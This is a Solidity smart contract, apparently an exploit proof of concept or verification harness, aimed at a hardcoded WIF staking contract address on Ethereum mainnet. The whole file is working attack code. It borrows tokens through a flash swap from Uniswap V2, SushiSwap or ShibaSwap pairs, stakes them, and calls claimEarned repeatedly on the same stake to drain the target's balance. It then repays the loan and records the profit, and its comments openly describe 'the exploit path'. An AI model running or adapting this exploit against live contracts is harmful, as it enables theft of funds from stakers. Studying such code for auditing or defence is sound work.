// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWIFStakingLike {
    function stakingToken() external view returns (address);
    function stake(uint256 stakingId, uint256 amount) external;
    function claimEarned(uint256 stakingId, uint256 burnRate) external;
    function plans(uint256 stakingId)
        external
        view
        returns (
            uint256 overallStaked,
            uint256 stakesCount,
            uint256 apr,
            uint256 stakeDuration,
            bool conclude
        );
    function stakes(uint256 stakingId, address account, uint256 index)
        external
        view
        returns (uint256 amount, uint256 stakeAt, uint256 endstakeAt);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xA1cE40702E15d0417a6c74D0bAB96772F36F4E99;
    uint256 internal constant MIN_BURN_RATE = 10;
    uint256 internal constant MAX_LOOP_CLAIMS = 512;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant SHIBASWAP_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;

    address private _profitTokenCache;
    uint256 private _profitAmountCache;
    bool private _executed;

    address private _activePair;
    uint256 private _activePlanId;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address token = _stakingToken();
        _profitTokenCache = token;
        if (token == address(0)) {
            return;
        }

        (bool planFound, uint256 planId, uint256 aprBps) = _selectPlan();
        if (!planFound || aprBps == 0) {
            // No live plan means the exploit path cannot begin because no new stake can be created.
            return;
        }
        _activePlanId = planId;

        uint256 localBalance = IERC20Like(token).balanceOf(address(this));
        if (localBalance > 0) {
            _profitAmountCache = _runDirectPath(token, planId, localBalance);
            return;
        }

        // If the staking contract holds no pre-existing balance, repeated claims only recycle the
        // attacker-funded stake and cannot leave enough liquid tokens to repay temporary capital.
        uint256 targetBalance = IERC20Like(token).balanceOf(TARGET);
        if (targetBalance == 0) {
            return;
        }

        _startFlashPath(token, planId, aprBps, targetBalance);
    }

    function profitToken() external view returns (address) {
        if (_profitTokenCache != address(0)) {
            return _profitTokenCache;
        }
        return _readStakingToken();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmountCache;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _onFlashCallback(sender, amount0, amount1);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _onFlashCallback(sender, amount0, amount1);
    }

    function ShibaSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _onFlashCallback(sender, amount0, amount1);
    }

    function _onFlashCallback(address sender, uint256 amount0, uint256 amount1) internal {
        require(msg.sender == _activePair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        address token = _profitTokenCache;
        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        uint256 repayment = _flashRepayment(borrowed);
        uint256 borrowedBalance = IERC20Like(token).balanceOf(address(this));
        require(borrowedBalance > 0, "no borrowed tokens");

        _safeApprove(token, TARGET, 0);
        _safeApprove(token, TARGET, borrowedBalance);
        IWIFStakingLike(TARGET).stake(_activePlanId, borrowedBalance);

        (uint256 stakedAmount,,) = IWIFStakingLike(TARGET).stakes(_activePlanId, address(this), 0);
        require(stakedAmount > 0, "stake failed");

        (, , uint256 aprBps, , ) = IWIFStakingLike(TARGET).plans(_activePlanId);
        _claimLoop(token, _activePlanId, stakedAmount, aprBps, repayment);

        uint256 liquidAfterClaims = IERC20Like(token).balanceOf(address(this));
        require(liquidAfterClaims >= repayment, "insufficient liquid profit");

        _safeTransfer(token, _activePair, repayment);
        _profitAmountCache = IERC20Like(token).balanceOf(address(this));
    }

    function _runDirectPath(address token, uint256 planId, uint256 amount) internal returns (uint256) {
        _safeApprove(token, TARGET, 0);
        _safeApprove(token, TARGET, amount);
        IWIFStakingLike(TARGET).stake(planId, amount);

        (uint256 stakedAmount,,) = IWIFStakingLike(TARGET).stakes(planId, address(this), 0);
        if (stakedAmount == 0) {
            return 0;
        }

        (, , uint256 aprBps, , ) = IWIFStakingLike(TARGET).plans(planId);

        // Strict path mapping:
        // 1. Stake in a live plan.
        // 2. Claim immediately, before lock expiry.
        // 3. Claim again on the same unchanged stake. Extra identical repeats are only used when a
        //    realistic flash-swap lender must be repaid, which does not alter the exploit causality.
        return _claimLoop(token, planId, stakedAmount, aprBps, 0);
    }

    function _claimLoop(
        address token,
        uint256 planId,
        uint256 stakedAmount,
        uint256 aprBps,
        uint256 repaymentTarget
    ) internal returns (uint256 claimedNet) {
        uint256 grossPerClaim = (stakedAmount * aprBps) / 10_000;
        if (grossPerClaim == 0) {
            return 0;
        }

        uint256 availableGrossClaims = IERC20Like(token).balanceOf(TARGET) / grossPerClaim;
        if (availableGrossClaims == 0) {
            return 0;
        }

        uint256 minClaims = _minClaimsForPathAndRepayment(aprBps, repaymentTarget > 0);
        if (availableGrossClaims < minClaims) {
            // The contract balance cannot cover the repeated fixed claims required at this fork state.
            return 0;
        }

        uint256 loopCount = availableGrossClaims;
        if (loopCount > MAX_LOOP_CLAIMS) {
            loopCount = MAX_LOOP_CLAIMS;
        }
        if (loopCount < minClaims) {
            loopCount = minClaims;
        }

        for (uint256 i = 0; i < loopCount; ++i) {
            uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
            (bool ok,) = TARGET.call(
                abi.encodeWithSelector(IWIFStakingLike.claimEarned.selector, planId, MIN_BURN_RATE)
            );
            if (!ok) {
                break;
            }

            uint256 afterBal = IERC20Like(token).balanceOf(address(this));
            if (afterBal <= beforeBal) {
                break;
            }

            claimedNet += afterBal - beforeBal;

            if (repaymentTarget > 0 && afterBal >= repaymentTarget && i + 1 >= 2) {
                break;
            }
        }
    }

    function _startFlashPath(address token, uint256, uint256 aprBps, uint256 targetBalance) internal {
        uint256 minClaims = _minClaimsForPathAndRepayment(aprBps, true);
        uint256 maxBorrowByTarget = _maxBorrowSupportedByTarget(aprBps, minClaims, targetBalance);
        if (maxBorrowByTarget == 0) {
            // Staking liquidity is too small to both repeat claims and repay a flash swap.
            return;
        }

        (address bestPair, uint256 bestBorrowAmount, bool bestTokenIs0) = _bestFlashPair(token, maxBorrowByTarget);

        if (bestPair == address(0) || bestBorrowAmount == 0) {
            // No suitable public pair existed for realistic temporary funding at this fork state.
            return;
        }

        _activePair = bestPair;

        if (bestTokenIs0) {
            IUniswapV2PairLike(bestPair).swap(bestBorrowAmount, 0, address(this), hex"01");
        } else {
            IUniswapV2PairLike(bestPair).swap(0, bestBorrowAmount, address(this), hex"01");
        }
    }

    function _bestFlashPair(address token, uint256 maxBorrowByTarget)
        internal
        view
        returns (address bestPair, uint256 bestBorrowAmount, bool bestTokenIs0)
    {
        address[3] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY, SHIBASWAP_FACTORY];
        address[3] memory quotes = [WETH, USDC, USDT];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < quotes.length; ++j) {
                if (quotes[j] == token) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[i]).getPair(token, quotes[j]);
                if (pair == address(0)) {
                    continue;
                }

                (uint256 tokenReserve, bool tokenIs0) = _pairTokenReserve(pair, token);
                uint256 borrowAmount = _cappedBorrowAmount(tokenReserve, maxBorrowByTarget);
                if (borrowAmount > bestBorrowAmount) {
                    bestBorrowAmount = borrowAmount;
                    bestPair = pair;
                    bestTokenIs0 = tokenIs0;
                }
            }
        }
    }

    function _selectPlan() internal view returns (bool found, uint256 planId, uint256 aprBps) {
        for (uint256 id = 4; id > 0; --id) {
            (, , uint256 apr, , bool conclude) = IWIFStakingLike(TARGET).plans(id - 1);
            if (!conclude && apr > 0) {
                return (true, id - 1, apr);
            }
        }
        return (false, 0, 0);
    }

    function _minClaimsForPathAndRepayment(uint256 aprBps, bool needsRepayment) internal pure returns (uint256) {
        uint256 netPerClaimBps = (aprBps * (100 - MIN_BURN_RATE)) / 100;
        if (netPerClaimBps == 0) {
            return type(uint256).max;
        }

        uint256 minClaims = 2;
        if (needsRepayment) {
            uint256 numerator = 10_000_000 + (997 * netPerClaimBps) - 1;
            uint256 repaymentClaims = numerator / (997 * netPerClaimBps);
            if (repaymentClaims > minClaims) {
                minClaims = repaymentClaims;
            }
        }
        return minClaims;
    }

    function _maxBorrowSupportedByTarget(
        uint256 aprBps,
        uint256 minClaims,
        uint256 targetBalance
    ) internal pure returns (uint256) {
        uint256 grossClaimsBps = minClaims * aprBps;
        if (grossClaimsBps <= 10_000) {
            return targetBalance;
        }

        uint256 denominator = grossClaimsBps - 10_000;
        return (targetBalance * 10_000) / denominator;
    }

    function _pairTokenReserve(address pair, address token) internal view returns (uint256 reserve, bool tokenIs0) {
        address token0 = IUniswapV2PairLike(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (token0 == token) {
            return (uint256(reserve0), true);
        }
        return (uint256(reserve1), false);
    }

    function _cappedBorrowAmount(uint256 tokenReserve, uint256 maxBorrowByTarget) internal pure returns (uint256) {
        if (tokenReserve <= 1) {
            return 0;
        }

        uint256 pairCap = tokenReserve / 2;
        if (pairCap == 0) {
            pairCap = tokenReserve - 1;
        }
        if (maxBorrowByTarget < pairCap) {
            return maxBorrowByTarget;
        }
        return pairCap;
    }

    function _flashRepayment(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }

    function _stakingToken() internal view returns (address token) {
        token = _profitTokenCache;
        if (token == address(0)) {
            token = _readStakingToken();
        }
    }

    function _readStakingToken() internal view returns (address token) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IWIFStakingLike.stakingToken.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}
